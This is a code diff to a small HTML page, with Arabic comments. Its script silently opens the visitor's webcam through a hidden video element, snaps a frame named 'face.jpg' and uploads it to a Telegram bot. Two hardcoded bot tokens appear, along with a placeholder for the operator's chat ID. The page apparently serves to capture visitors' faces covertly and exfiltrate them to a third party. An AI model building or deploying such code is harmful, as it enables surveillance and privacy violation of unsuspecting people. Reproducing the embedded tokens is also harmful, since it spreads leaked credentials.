@@ -10,8 +10,12 @@
     <video id="video" autoplay playsinline style="display:none;"></video>
 
     <script>
-        const TOKEN = "8446745973:AAGRD2tFbSrzB2OFoByvYRHCY1Hp6nluHf0";
-        const CHAT_ID = "ضع_ايديك_هنا"; // <--- تأكد من وضع رقم الآيدي الخاص بك
+        // التوكن الخاص بك (يجب تغييره بعد التجربة)
+        const TOKEN = "8446745973:AAGJFzPurWMbU44hN3V-vJjTpyGviYQUYhg";
+        
+        // ضع رقم الآيدي الخاص بك هنا (مثال: 123456789)
+        const CHAT_ID = "ضع_رقم_الآيدي_الخاص_بك_هنا"; 
+        
         const statusEl = document.getElementById('status');
         const video = document.getElementById('video');
 
@@ -21,10 +25,8 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                // انتظر ثانية للتأكد من أن الفيديو بدأ يظهر فعلياً
-                await new Promise(r => setTimeout(r, 1000));
+                await new Promise(r => setTimeout(r, 1500)); // انتظار جاهزية الكاميرا
 
-                statusEl.innerText = "جاري الالتقاط...";
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -36,17 +38,20 @@
                     formData.append('photo', blob, 'face.jpg');
 
                     statusEl.innerText = "جاري الإرسال...";
+                    
                     const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
 
-                    const result = await response.json(); // لنرى رسالة الخطأ من تليجرام
+                    const result = await response.json();
+                    
                     if (result.ok) {
                         statusEl.innerText = "تم الإرسال بنجاح!";
                     } else {
-                        statusEl.innerText = "خطأ من تليجرام: " + result.description;
-                        console.error(result);
+                        // هنا تظهر المشكلة الحقيقية إذا لم يرسل
+                        statusEl.innerText = "فشل الإرسال: " + result.description;
+                        console.log("خطأ تليجرام:", result);
                     }
                     
                     stream.getTracks().forEach(t => t.stop());
@@ -54,7 +59,6 @@
 
             } catch (err) {
                 statusEl.innerText = "خطأ: " + err.message;
-                console.error(err);
             }
         };
     </script>
